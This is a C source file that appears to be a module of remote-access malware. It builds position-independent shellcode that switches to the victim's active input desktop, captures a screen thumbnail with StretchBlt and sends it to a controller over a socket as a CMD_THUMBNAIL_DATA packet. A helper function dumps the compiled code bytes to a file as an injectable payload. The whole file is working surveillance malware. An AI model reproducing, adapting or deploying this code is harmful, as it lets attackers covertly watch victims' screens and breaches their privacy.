#include "global_data.h"
#include "shellcodes.h"

extern void __cdecl thumbnail_entry(global_data_t *global_data);
extern int __cdecl thumbnail_send(global_data_t *global_data, SOCKET s);
extern void __cdecl thumbnail_code_end();

#define FIX(name) xthumbnail.##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __cdecl thumbnail_entry(global_data_t *global_data) {
  uint32_t delta;

  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  FIX(thumbnail_send);
}

int __cdecl thumbnail_send(global_data_t *global_data, SOCKET s) {
  DWORD tick = xGetTickCount();
  if (tick - xthumbnail.tick < 1000 * 10) return 0;
  
  xthumbnail.tick = tick;

  HWND wnd;
  HDC dc;
  DWORD	needed;
  HDESK	old, new_;

  char	current[256], input[256];

  old = xGetThreadDesktop(xGetCurrentThreadId());
  zero_memory(current, sizeof(current));
  xGetUserObjectInformationA(old, UOI_NAME, &current, sizeof(current), &needed);

  new_ = xOpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
  zero_memory(input, sizeof(input));
  xGetUserObjectInformationA(new_, UOI_NAME, &input, sizeof(input), &needed);

  if (xlstrcmpiA(input, current) != 0) xSetThreadDesktop(new_);

  xCloseDesktop(old);
  xCloseDesktop(new_);

  wnd = xGetDesktopWindow();
  dc = xGetDC(wnd);

  int width = xGetSystemMetrics(SM_CXSCREEN);
  int height = xGetSystemMetrics(SM_CYSCREEN);

  bitmap_t *thumbnail_bitmap = xbitmap_new(dc, 32, width / 10, height / 10);

  xStretchBlt(thumbnail_bitmap->dc, 0, 0, 128, 96, dc, 0, 0, width, height, SRCCOPY | CAPTUREBLT);

  buffer_t *buf = xbuffer_new();

  xbitmap_save(thumbnail_bitmap, buf);

  xbitmap_free(thumbnail_bitmap);

  int ret = xsend_packet(s, CMD_THUMBNAIL_DATA, (const char *)buf->data, buf->size);

  xbuffer_free(buf);

  xReleaseDC(wnd, dc);

  return ret;
}

void __cdecl thumbnail_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void thumbnail_send_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)thumbnail_entry;
  end = (char *)thumbnail_code_end;

  printf("[*] thumbnail_send code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);

  fclose(f);

  printf("[*] save thumbnail_send to %s success.\n", filename);
}